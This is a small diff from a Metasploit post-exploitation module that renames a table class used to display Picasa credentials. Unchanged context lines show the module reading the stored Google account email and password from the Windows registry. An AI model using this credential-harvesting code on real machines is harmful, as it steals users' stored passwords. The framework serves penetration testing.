@@ -73,7 +73,7 @@ class MetasploitModule < Msf::Post
       username = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaEmail') || ''
       password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\", 'GaiaPass')  || ''
 
-      credentials = Rex::Ui::Text::Table.new(
+      credentials = Rex::Text::Table.new(
           'Header'    => "Picasa Credentials",
           'Indent'    => 1,
           'Columns'   =>
